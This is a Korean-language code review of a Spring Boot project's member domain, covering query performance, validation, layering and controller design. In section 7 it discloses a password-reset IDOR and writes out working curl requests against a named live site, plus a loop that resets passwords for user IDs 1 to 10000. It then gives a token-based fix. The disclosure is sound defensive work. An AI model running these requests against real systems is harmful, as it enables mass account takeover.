(반대로 **오버라이딩(overriding)** 은 상속 관계에서 재정의하는 것으로, 런타임에 결정됩니다.)

두 번째 버전은 `BoardService.transformBoardDtos`에서 씁니다.
프로젝션 DTO에는 `Member` 엔티티가 없고 `points` 값만 있으므로 `int` 버전이 필요합니다.

### ⚠️ 성능 문제 — 게시글 목록에서 N번 호출된다

```java
// BoardService
return projectionDtos.map(dto ->
        BoardListResponseDto.builder()
                ...
                .writerLevel(memberService.getMemberTierOrder(dto.writerPoint()))  // ★ 행마다 쿼리!
                .build());
```

게시글 20개를 조회하면 **`findTierOrderByPoints` 쿼리가 20번** 실행됩니다.
티어 테이블은 몇 행뿐이고 거의 바뀌지 않으므로 **메모리에 캐싱하는 것이 정답**입니다.

```java
@Service
@RequiredArgsConstructor
public class PointTierService {

    private final PointTierRepository pointTierRepository;
    private volatile List<PointTier> cachedTiers;

    @EventListener(ApplicationReadyEvent.class)
    public void loadTiers() {
        this.cachedTiers = pointTierRepository.findAll().stream()
                .sorted(Comparator.comparingInt(PointTier::getTierOrder))
                .toList();
    }

    public int getTierOrder(int points) {          // 쿼리 0회
        return cachedTiers.stream()
                .filter(t -> points >= t.getMinPoint())
                .max(Comparator.comparingInt(PointTier::getTierOrder))
                .map(PointTier::getTierOrder)
                .orElse(1);
    }
}
```

자세한 내용은 [pointTier.md](pointTier.md)에서 다룹니다.

## 3-7. `@Valid`가 서비스에서는 동작하지 않는다

```java
public void changeNickname(PrincipalDetails principalDetails,
                           @Valid ChangeNicknameRequestDto changeNicknameRequestDto) {
//                         ^^^^^^ 아무 일도 하지 않는다
```

`@Valid`는 **Spring MVC가 컨트롤러 인자를 바인딩할 때** 처리합니다.
서비스 메서드 파라미터에 붙여도 무시됩니다.

서비스에서 검증을 실행하려면 클래스에 `@Validated`를 붙여야 합니다:

```java
@Service
@Validated                                   // 이게 있어야 메서드 파라미터 검증이 동작
public class MemberService {
    public void changeNickname(@Valid ChangeNicknameRequestDto dto) { ... }
}
```

하지만 **컨트롤러에서 이미 `@Valid`로 검증하고 있으므로 중복입니다.**
서비스의 `@Valid`는 지우는 것이 맞습니다. (`signup`, `checkDuplicateEmail` 등에는 없는데
`changeNickname`, `checkPassword`, `changePasswordByUserId`에만 있어 일관성도 없습니다.)

## 3-8. 서비스가 `ResponseDTO`를 반환하는 문제

```java
// MemberService — 계층 경계를 넘었다
public ResponseDTO<GetUserResponseDto> getMemberInfo(PrincipalDetails principalDetails) {
    int level = getMemberTierOrder(principalDetails.getMember());
    return ResponseDTO.okWithData(GetUserResponseDto.fromEntity(principalDetails.getMember(), level));
}

public ResponseDTO<GetUserIdByEmailResponseDto> getUserIdByEmail(String email) {
    Member member = memberRepository.findByMemberBaseEmail(email).orElseThrow(UserNotFoundException::new);
    return ResponseDTO.okWithData(GetUserIdByEmailResponseDto.fromEntity(member));
}
```

`ResponseDTO`는 **HTTP 응답 형식**입니다. 서비스가 이걸 만들면:

1. **서비스를 HTTP 밖에서 재사용할 수 없습니다** (배치, 스케줄러, 다른 서비스에서 호출 시 껍데기가 거추장스러움)
2. **테스트가 번거로워집니다** (실제 데이터를 꺼내려면 `ResponseDTO`를 벗겨야 함)
3. **같은 클래스 안에서 일관성이 없습니다** — `signup`은 `SignUpResponseDto`를 반환하는데
   `getMemberInfo`는 `ResponseDTO<...>`를 반환합니다.

```java
// 서비스는 도메인 결과만
public GetUserResponseDto getMemberInfo(PrincipalDetails principalDetails) {
    int level = getMemberTierOrder(principalDetails.getMember());
    return GetUserResponseDto.fromEntity(principalDetails.getMember(), level);
}

// 컨트롤러가 HTTP 형식으로 감싼다
@GetMapping("/info")
public ResponseEntity<ResponseDTO<GetUserResponseDto>> getMemberInfo(
        @AuthenticationPrincipal PrincipalDetails principalDetails) {
    GetUserResponseDto result = memberService.getMemberInfo(principalDetails);
    ResponseDTO<GetUserResponseDto> response = ResponseDTO.okWithData(result);
    return ResponseEntity.status(response.getCode()).body(response);
}
```

**계층의 책임**: "각 계층은 자기 아래 계층의 타입만 다룬다. 위 계층의 타입은 모른다."

---

# 4. `MemberController` — 엔드포인트 11개

| 메서드 | 경로 | 인증 | 설명 |
|---|---|---|---|
| POST | `/api/member/signup` | 공개 | 회원가입 |
| GET | `/api/member/test/jwt` | 공개⚠️ | JWT 테스트용 (삭제 대상) |
| GET | `/api/member/check-duplicated-email` | 공개 | 이메일 중복 확인 |
| GET | `/api/member/check-duplicated-nickname` | 공개 | 닉네임 중복 확인 |
| GET | `/api/member/id` | **공개**🔴 | 이메일로 userId 조회 |
| PATCH | `/api/member/password/user/{userId}` | **공개**🔴 | userId로 비밀번호 재설정 |
| PATCH | `/api/member/password` | 필요 | 비밀번호 변경 (현재 비번 확인) |
| PATCH | `/api/member/nickname` | 필요 | 닉네임 변경 |
| POST | `/api/member/check-password` | 필요 | 현재 비밀번호 확인 |
| GET | `/api/member/info` | 필요 | 내 정보 조회 |
| DELETE | `/api/member` | 필요 | 회원탈퇴 |

```java
@RestController
@RequestMapping("api/member")        // ⚠️ 앞에 '/'가 없다
@RequiredArgsConstructor
public class MemberController {
```

**`"api/member"` vs `"/api/member"`**: 스프링이 앞에 `/`를 자동으로 붙여주므로 동작은 같습니다.
하지만 다른 컨트롤러는 모두 `/api/...`로 쓰고 있어 **일관성이 없습니다.**
(`RecommendationController`의 `"api/ai-recommend"`, `AIAnalysisController`의 `"api/analysis"`도 같은 상태)

**컨트롤러의 반복 패턴** — 모든 메서드가 동일합니다:

```java
@PostMapping("/signup")
public ResponseEntity<ResponseDTO<SignUpResponseDto>> signup(
        @Valid @RequestBody SignUpRequestDto signUpRequestDto) {   // ① 바인딩 + 검증
    SignUpResponseDto result = memberService.signup(signUpRequestDto);  // ② 서비스 위임
    ResponseDTO<SignUpResponseDto> response = ResponseDTO.okWithData(result);  // ③ 감싸기
    return ResponseEntity.status(response.getCode()).body(response);            // ④ 반환
}
```

**컨트롤러에 로직이 없는 것이 좋은 신호입니다.** 검증은 어노테이션이, 로직은 서비스가 합니다.
(예외적으로 `InterviewController`는 파일 검증 로직을 갖고 있는데, 그건 개선 대상입니다.)

## 4-1. `@DeleteMapping("")` — 빈 문자열 경로

```java
@DeleteMapping("")
public ResponseEntity<ResponseDTO<Void>> deleteMember(...)
```

`DELETE /api/member`에 매핑됩니다. `@DeleteMapping`(값 없음)으로 쓰는 것이 관례에 더 맞습니다.

## 4-2. `/api/member/test/jwt` — 프로덕션에 남은 테스트 코드

```java
// Authenticated user 샘플테스트 코드입니다
@GetMapping("/test/jwt")
public ResponseEntity<ResponseDTO<TestUserResponseDto>> test(
        @AuthenticationPrincipal PrincipalDetails principalDetails) {
    Member member = principalDetails.getMember();     // ⚠️ permitAll인데 null 가능 → NPE
    ...
}
```

`SpringSecurityConfig`에서 `permitAll`로 열려 있습니다.
인증 없이 호출하면 `principalDetails`가 `null`이라 **NPE → 500**입니다.
**개발용 코드이므로 삭제 대상입니다.** (`TestUserResponseDto`도 함께)

---

# 5. 이 도메인의 흐름 정리

## 5-1. 회원가입 → 로그인 전체 흐름

```
[회원가입]
POST /api/member/signup { "email": "a@b.com", "password": "1234" }
  → MemberController.signup
  → @Valid 검증 (이메일 형식, null 여부)
  → MemberService.signup
      ① findByMemberBaseEmail → 중복 확인
      ② passwordEncoder.encode("1234") → "$2a$10$..." 해시
      ③ 랜덤 닉네임 생성 + 중복 확인 루프
      ④ pointTierRepository.findById(1L) → 기본 티어
      ⑤ save(newMember) → INSERT
  → SignUpResponseDto { memberId, email, name }

[로그인]  ※ MemberController가 아니라 필터가 처리
POST /login { "email": "a@b.com", "password": "1234" }
  → JwtAuthenticationFilter.attemptAuthentication
  → AuthenticationManager → DaoAuthenticationProvider
      ① AuthConfig.loadUserByUsername("a@b.com") → DB 조회 → PrincipalDetails
      ② BCryptPasswordEncoder.matches("1234", "$2a$10$...") → 비교
  → JwtAuthenticationFilter.successfulAuthentication
      ① jwtProvider.createToken(member) → JWT 발급
      ② memberService.getMemberTierOrder(member) → 레벨 조회
  → LoginResponseDto { email, name, token, userId, role, point, level }

[이후 모든 요청]
GET /api/member/info  Authorization: Bearer eyJ...
  → JwtAuthorizationFilter
      ① 헤더에서 토큰 추출
      ② jwtProvider.getEmail(token) → 서명 검증 + sub 추출
      ③ memberRepository.findByMemberBaseEmail(email) → DB 조회 ★매 요청 1회
      ④ PrincipalDetails로 감싸 SecurityContext에 저장
  → MemberController.getMemberInfo
      @AuthenticationPrincipal이 SecurityContext에서 꺼냄
```

**③에 주목하세요.** 모든 인증된 요청마다 회원 조회 쿼리가 1번 발생합니다.
토큰에 `memberId`와 `authority`를 담으면 이 쿼리를 없앨 수 있습니다
(권한 변경이 즉시 반영되지 않는 대가를 감수).

## 5-2. 비밀번호 재설정 흐름 — 여기가 문제입니다

프론트엔드가 이 순서로 호출하도록 설계된 것으로 보입니다:

```
① POST /api/email/confirmation  { email }         → 인증번호 메일 발송
② POST /api/email/verify        { email, code }   → 인증번호 확인
③ GET  /api/member/id?email=... → userId 획득
④ PATCH /api/member/password/user/{userId}  { newPassword }  → 비밀번호 변경
```

**문제: ①②를 건너뛰고 ③④만 호출할 수 있습니다.**

---

# 6. 개선하면 좋은 것

| 항목 | 현재 | 개선 |
|---|---|---|
| 클래스 `@Transactional` | 모든 메서드가 쓰기 트랜잭션 | `@Transactional(readOnly = true)` 기본 + 쓰기 메서드에만 `@Transactional` |
| 수정 방식 | `merge`와 더티 체킹이 섞임 | `findById` + 필드 변경으로 통일 |
| 중복 확인 | `findBy...ifPresent` | `existsBy...` |
| 닉네임 생성 루프 | 2곳에 복사, 종료 보장 없음 | 공통 메서드로 추출 + 최대 시도 횟수 |
| 기본 티어 | `findById(1L)` 하드코딩 | `tierOrder` 최소값으로 조회 |
| 비밀번호 정책 | `@NotNull`만 | `@Size` + `@Pattern` |
| 유니크 제약 | 없음 | `(email, provider)`, `nickname` |
| 회원탈퇴 | 물리 삭제 → FK 위반 | soft delete + `isEnabled()` 연결 |
| 서비스 반환 타입 | `ResponseDTO` 반환 | 도메인 DTO만 반환 |
| 서비스 `@Valid` | 동작하지 않는 장식 | 삭제 |
| 티어 조회 | 목록 조회 시 N번 쿼리 | 메모리 캐싱 |
| 테스트 엔드포인트 | `/test/jwt` 노출 | 삭제 |
| `@RequestMapping` | `"api/member"` | `"/api/member"` |

---

# 7. 🔴 치명적: 누구나 남의 비밀번호를 바꿀 수 있다

**이 프로젝트 전체에서 가장 심각한 결함입니다.** 배포 중인 서비스에 그대로 있습니다.

## 7-1. 무엇이 문제인가

### `SpringSecurityConfig` — 두 엔드포인트가 무인증으로 열려 있음

```java
.requestMatchers(new AntPathRequestMatcher("/api/member/password/user/**")).permitAll()
.requestMatchers(new AntPathRequestMatcher("/api/member/id")).permitAll()
```

### `MemberController` — 아무 확인 없이 비밀번호를 바꿈

```java
@PatchMapping("/password/user/{userId}")
public ResponseEntity<ResponseDTO<Void>> changePassword(
        @PathVariable Long userId,                                     // 경로에서 받은 ID
        @Valid @RequestBody ChangePasswordByUserIdRequestDto dto) {    // 새 비밀번호만
    memberService.changePasswordByUserId(userId, dto);
    ...
}
```

### `ChangePasswordByUserIdRequestDto` — 검증 수단이 전혀 없음

```java
public record ChangePasswordByUserIdRequestDto(
    String newPassword          // 현재 비밀번호도, 인증 토큰도, 이메일 코드도 없다
) {}
```

### `MemberService` — 요청자가 본인인지 확인하지 않음

```java
public void changePasswordByUserId(Long userId, ChangePasswordByUserIdRequestDto dto) {
    Member member = memberRepository.findById(userId).orElseThrow(UserNotFoundException::new);
    String encodedNewPassword = passwordEncoder.encode(dto.newPassword());
    member.getMemberBase().changePassword(encodedNewPassword);
    memberRepository.save(member);
}
```

**"userId를 아는 사람 = 그 계정의 주인"** 이라고 가정하고 있습니다.

## 7-2. 공격 시나리오 — 두 번의 요청

```bash
# ① 피해자 이메일로 userId를 알아낸다 (이 API도 무인증)
curl "https://gaebang.site/api/member/id?email=victim@gmail.com"
# → { "code": 200, "data": { "userId": 42 } }

# ② 그 userId의 비밀번호를 바꾼다 (인증 없음, 현재 비밀번호 불필요)
curl -X PATCH "https://gaebang.site/api/member/password/user/42" \
     -H "Content-Type: application/json" \
     -d '{"newPassword":"attacker1234"}'
# → { "code": 200, "message": "비밀번호가 성공적으로 재설정 되었습니다." }

# ③ 이제 공격자가 로그인한다
curl -X POST "https://gaebang.site/login" \
     -d '{"email":"victim@gmail.com","password":"attacker1234"}'
```

**계정 완전 탈취(Account Takeover)입니다.**

`userId`는 순차적인 `AUTO_INCREMENT` 값이므로 **이메일을 몰라도 됩니다.**
1부터 순서대로 돌리면 전체 회원의 비밀번호를 바꿀 수 있습니다.

```bash
for i in $(seq 1 10000); do
  curl -X PATCH ".../api/member/password/user/$i" -d '{"newPassword":"..."}'
done
```

## 7-3. 왜 이렇게 되었나

의도는 **"비밀번호 찾기"** 기능이었을 것입니다.
`email` 도메인에 인증번호 발송(`/api/email/confirmation`)과 확인(`/api/email/verify`)이 있습니다.
프론트엔드가 "인증번호 확인 → 비밀번호 재설정"으로 호출하니 문제없다고 본 것입니다.

**하지만 서버는 프론트엔드를 신뢰할 수 없습니다.**
누구든 `curl`로 ④번 API만 직접 호출할 수 있습니다.
**"프론트가 순서대로 부를 테니 괜찮다"는 가정은 보안에서 절대 성립하지 않습니다.**

## 7-4. 고치는 방법 — 재설정 토큰 방식

인증번호 확인이 **성공했다는 증거**를 서버가 발급하고, 재설정 시 그 증거를 요구해야 합니다.

**① 인증번호 확인 시 일회용 재설정 토큰 발급**

```java
// EmailService — 인증번호가 맞으면 재설정 토큰을 만들어 Redis에 저장
public EmailVerifiedResponse verifyCode(String email, String code) {
    String saved = redisTemplate.opsForValue().get("email:code:" + email);
    if (saved == null || !saved.equals(code)) {
        throw new InvalidEmailCodeException();
    }
    redisTemplate.delete("email:code:" + email);      // 인증번호는 즉시 폐기

    String resetToken = UUID.randomUUID().toString();
    redisTemplate.opsForValue().set(
        "pwreset:" + resetToken, email, Duration.ofMinutes(10));   // 10분만 유효

    return new EmailVerifiedResponse(resetToken);
}
```

**② 비밀번호 재설정은 이메일이 아니라 토큰으로 대상을 정한다**

```java
public record ResetPasswordRequestDto(
        @NotBlank String resetToken,

        @NotBlank
        @Size(min = 8, max = 64, message = "비밀번호는 8~64자여야 합니다")
        @Pattern(regexp = "^(?=.*[A-Za-z])(?=.*\\d)(?=.*[^A-Za-z\\d]).{8,}$",
                 message = "영문·숫자·특수문자를 각각 포함해야 합니다")
        String newPassword
) {}
```

```java
@Transactional
public void resetPassword(ResetPasswordRequestDto dto) {
    String key = "pwreset:" + dto.resetToken();
    String email = redisTemplate.opsForValue().get(key);
    if (email == null) {
        throw new InvalidResetTokenException();       // 만료되었거나 위조된 토큰
    }
    redisTemplate.delete(key);                        // ★ 일회용 — 즉시 폐기

    Member member = memberRepository.findByMemberBaseEmail(email)
            .orElseThrow(UserNotFoundException::new);
    member.getMemberBase().changePassword(passwordEncoder.encode(dto.newPassword()));
    // save() 불필요 — 영속 상태이므로 더티 체킹이 처리
}
```

```java
@PatchMapping("/password/reset")
public ResponseEntity<ResponseDTO<Void>> resetPassword(
        @Valid @RequestBody ResetPasswordRequestDto dto) {
    memberService.resetPassword(dto);
    ResponseDTO<Void> response = ResponseDTO.okWithMessage("비밀번호가 재설정되었습니다.");
    return ResponseEntity.status(response.getCode()).body(response);
}
```

**③ 위험한 엔드포인트 2개를 없앤다**

```java
// 삭제: PATCH /api/member/password/user/{userId}
// 삭제: GET   /api/member/id            ← userId를 외부에 알려줄 이유가 없다
```

`/api/member/id`는 **이메일 존재 여부를 알려주는 계정 열거(enumeration) 취약점**도 됩니다.
"이 이메일이 가입되어 있나?"를 무제한으로 물어볼 수 있으니까요.

**④ 시큐리티 설정에서 제거하고 새 경로만 허용**

```java
.requestMatchers(HttpMethod.PATCH, "/api/member/password/reset").permitAll()
// /api/member/password/user/** 와 /api/member/id 는 목록에서 삭제
```

## 7-5. 재설정 토큰 설계의 핵심 4가지

| 원칙 | 이유 |
|---|---|
| **일회용** — 쓰면 즉시 삭제 | 토큰이 로그에 남아도 재사용 불가 |
| **짧은 만료** (10분) | 탈취 시 노출 창을 최소화 |
| **추측 불가** — `UUID.randomUUID()` | 순차 ID(`userId`)는 절대 사용 금지 |
| **대상은 서버가 결정** | 클라이언트가 `userId`를 지정하지 못하게 함 |

**네 번째가 이 취약점의 본질입니다.**
현재는 클라이언트가 `{userId}`로 **대상을 직접 지정**합니다.
토큰 방식은 서버가 "이 토큰은 victim@gmail.com의 것"이라고 **자기 저장소에서 확인**합니다.

> 이 유형의 취약점을 **IDOR(Insecure Direct Object Reference, 안전하지 않은 직접 객체 참조)** 라고 합니다.
> OWASP Top 10의 "Broken Access Control"에 속하며, 웹 취약점 중 가장 흔한 부류입니다.
> **판별법: "URL의 ID를 남의 것으로 바꾸면 남의 데이터가 나오는가?"**
>
> 이 프로젝트의 다른 API들은 대부분 `principalDetails.getMember().getId()`로
> **서버가 주체를 결정**하고 있어 안전합니다. 이 API만 예외입니다.

## 7-6. 추가로 필요한 방어

```java
// 인증번호 발송에 횟수 제한 (없으면 메일 폭탄 + 비용 발생)
// PostRateLimitService와 같은 방식을 재사용할 수 있습니다
@Transactional
public void sendConfirmationEmail(String email) {
    String rateKey = "email:rate:" + email;
    Long count = redisTemplate.opsForValue().increment(rateKey);
    if (count == 1) {
        redisTemplate.expire(rateKey, Duration.ofHours(1));
    }
    if (count > 5) {
        throw new EmailRateLimitExceededException();     // 시간당 5회
    }
    ...
}
```

또 **비밀번호 변경 후에는 기존 JWT를 무효화**해야 합니다.
현재는 stateless JWT라 무효화 수단이 없어서, 공격자가 이미 발급받은 토큰으로 40시간 더 접근할 수 있습니다.
Redis 블랙리스트나 `Member`에 `tokenVersion` 필드를 두는 방식으로 해결합니다.

---

## 다음 문서

- [point.md](point.md) — `Member.points`와 `Point` 원장의 관계. 트랜잭션·동시성 사례
- [pointTier.md](pointTier.md) — `getMemberTierOrder`의 N번 쿼리 문제
- [community.md](community.md) — `Member`를 참조하는 가장 큰 도메인
- [../global.md](../global.md) — 인증 필터와 시큐리티 설정
